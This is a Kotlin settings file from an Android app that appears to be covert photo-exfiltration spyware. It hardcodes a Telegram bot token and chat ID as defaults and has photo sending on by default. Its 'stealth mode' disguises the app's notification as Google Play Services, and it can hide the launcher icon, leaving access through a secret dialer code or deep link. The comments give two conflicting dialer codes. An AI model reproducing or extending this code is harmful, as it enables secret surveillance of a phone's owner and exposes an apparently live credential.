package com.david.photopriv.data.preferences

import android.content.Context
import android.content.SharedPreferences

data class SmtpConfig(
    val host: String = "smtp.gmail.com",
    val port: Int = 587,
    val useTls: Boolean = true,
    val senderEmail: String = "",
    val senderPassword: String = "",
    val recipientEmail: String = "",
    val autoSendImmediately: Boolean = true
) {
    val isConfigured: Boolean
        get() = senderEmail.isNotBlank() && senderPassword.isNotBlank() && recipientEmail.isNotBlank()
}

data class TelegramConfig(
    val botToken: String = SettingsManager.DEFAULT_TELEGRAM_BOT_TOKEN,
    val chatId: String = SettingsManager.DEFAULT_TELEGRAM_CHAT_ID,
    val enabled: Boolean = SettingsManager.DEFAULT_SEND_VIA_TELEGRAM,
    val autoSendImmediately: Boolean = true
) {
    val isConfigured: Boolean
        get() = botToken.isNotBlank() && chatId.isNotBlank()
}

data class AppPreferences(
    val deviceName: String = SettingsManager.getDefaultDeviceName(), // Nombre del dispositivo en Telegram
    val stealthMode: Boolean = true,    // Notificación camuflada como Servicios de Google Play
    val dataSaverMode: Boolean = true,  // Comprimir fotos a Full HD para ahorrar datos y enviar en 1s
    val hideAppIcon: Boolean = false    // Nivel 4: Ocultar icono del menú (abrir con *#*#0000#*#* o photopriv://open)
)

class SettingsManager(private val context: Context) {

    private val prefs: SharedPreferences =
        context.getSharedPreferences("photopriv_settings", Context.MODE_PRIVATE)

    companion object {
        // Credenciales predeterminadas de Telegram
        const val DEFAULT_TELEGRAM_BOT_TOKEN = "8919441805:AAGPfX4UxzQwphOeIGci6wexnBDz3DFLiqw"
        const val DEFAULT_TELEGRAM_CHAT_ID = "-1004363656402"
        const val DEFAULT_SEND_VIA_TELEGRAM = true

        // Device key
        private const val KEY_DEVICE_NAME = "device_name"

        fun getDefaultDeviceName(): String {
            val manufacturer = android.os.Build.MANUFACTURER.replaceFirstChar { 
                if (it.isLowerCase()) it.titlecase(java.util.Locale.getDefault()) else it.toString() 
            }
            val model = android.os.Build.MODEL
            return if (model.startsWith(manufacturer, ignoreCase = true)) {
                model
            } else {
                "$manufacturer $model"
            }
        }

        // SMTP keys
        private const val KEY_SMTP_HOST = "smtp_host"
        private const val KEY_SMTP_PORT = "smtp_port"
        private const val KEY_USE_TLS = "use_tls"
        private const val KEY_SENDER_EMAIL = "sender_email"
        private const val KEY_SENDER_PASSWORD = "sender_password"
        private const val KEY_RECIPIENT_EMAIL = "recipient_email"
        private const val KEY_AUTO_SEND = "auto_send"

        // Telegram keys
        private const val KEY_TELEGRAM_BOT_TOKEN = "telegram_bot_token"
        private const val KEY_TELEGRAM_CHAT_ID = "telegram_chat_id"
        private const val KEY_TELEGRAM_ENABLED = "telegram_enabled"

        // Stealth, Data Saver and Icon keys
        private const val KEY_STEALTH_MODE = "stealth_mode"
        private const val KEY_DATA_SAVER_MODE = "data_saver_mode"
        private const val KEY_HIDE_APP_ICON = "hide_app_icon"
    }

    fun getSmtpConfig(): SmtpConfig {
        return SmtpConfig(
            host = prefs.getString(KEY_SMTP_HOST, "smtp.gmail.com") ?: "smtp.gmail.com",
            port = prefs.getInt(KEY_SMTP_PORT, 587),
            useTls = prefs.getBoolean(KEY_USE_TLS, true),
            senderEmail = prefs.getString(KEY_SENDER_EMAIL, "") ?: "",
            senderPassword = prefs.getString(KEY_SENDER_PASSWORD, "") ?: "",
            recipientEmail = prefs.getString(KEY_RECIPIENT_EMAIL, "") ?: "",
            autoSendImmediately = prefs.getBoolean(KEY_AUTO_SEND, true)
        )
    }

    fun saveSmtpConfig(config: SmtpConfig) {
        prefs.edit()
            .putString(KEY_SMTP_HOST, config.host.trim())
            .putInt(KEY_SMTP_PORT, config.port)
            .putBoolean(KEY_USE_TLS, config.useTls)
            .putString(KEY_SENDER_EMAIL, config.senderEmail.trim())
            .putString(KEY_SENDER_PASSWORD, config.senderPassword.trim())
            .putString(KEY_RECIPIENT_EMAIL, config.recipientEmail.trim())
            .putBoolean(KEY_AUTO_SEND, config.autoSendImmediately)
            .apply()
    }

    fun getTelegramConfig(): TelegramConfig {
        return TelegramConfig(
            botToken = prefs.getString(KEY_TELEGRAM_BOT_TOKEN, DEFAULT_TELEGRAM_BOT_TOKEN) ?: DEFAULT_TELEGRAM_BOT_TOKEN,
            chatId = prefs.getString(KEY_TELEGRAM_CHAT_ID, DEFAULT_TELEGRAM_CHAT_ID) ?: DEFAULT_TELEGRAM_CHAT_ID,
            enabled = prefs.getBoolean(KEY_TELEGRAM_ENABLED, DEFAULT_SEND_VIA_TELEGRAM),
            autoSendImmediately = prefs.getBoolean(KEY_AUTO_SEND, true)
        )
    }

    fun saveTelegramConfig(config: TelegramConfig) {
        prefs.edit()
            .putString(KEY_TELEGRAM_BOT_TOKEN, config.botToken.trim())
            .putString(KEY_TELEGRAM_CHAT_ID, config.chatId.trim())
            .putBoolean(KEY_TELEGRAM_ENABLED, config.enabled)
            .putBoolean(KEY_AUTO_SEND, config.autoSendImmediately)
            .apply()
    }

    fun getAppPreferences(): AppPreferences {
        val defaultDevice = getDefaultDeviceName()
        return AppPreferences(
            deviceName = prefs.getString(KEY_DEVICE_NAME, defaultDevice)?.takeIf { it.isNotBlank() } ?: defaultDevice,
            stealthMode = prefs.getBoolean(KEY_STEALTH_MODE, true),
            dataSaverMode = prefs.getBoolean(KEY_DATA_SAVER_MODE, true),
            hideAppIcon = prefs.getBoolean(KEY_HIDE_APP_ICON, false)
        )
    }

    fun saveAppPreferences(appPrefs: AppPreferences) {
        val previousHide = prefs.getBoolean(KEY_HIDE_APP_ICON, false)
        prefs.edit()
            .putString(KEY_DEVICE_NAME, appPrefs.deviceName.trim())
            .putBoolean(KEY_STEALTH_MODE, appPrefs.stealthMode)
            .putBoolean(KEY_DATA_SAVER_MODE, appPrefs.dataSaverMode)
            .putBoolean(KEY_HIDE_APP_ICON, appPrefs.hideAppIcon)
            .apply()

        if (previousHide != appPrefs.hideAppIcon) {
            setLauncherIconVisibility(!appPrefs.hideAppIcon)
        }
    }

    /**
     * Habilita o deshabilita el icono del Launcher dinámicamente mediante el alias LauncherAlias.
     * Si visible == false: el icono desaparece 100% del cajón de aplicaciones.
     * La app sigue operativa y puede abrirse marcando *#*#7468#*#* o con el deep link photopriv://open.
     */
    fun setLauncherIconVisibility(visible: Boolean) {
        try {
            val componentName = android.content.ComponentName(
                context.packageName,
                "${context.packageName}.LauncherAlias"
            )
            val newState = if (visible) {
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            } else {
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            }
            context.packageManager.setComponentEnabledSetting(
                componentName,
                newState,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            android.util.Log.d("SettingsManager", "Visibilidad del icono del launcher cambiada: visible = $visible")
        } catch (e: Exception) {
            android.util.Log.e("SettingsManager", "Error actualizando visibilidad del launcher: ${e.message}", e)
        }
    }
}
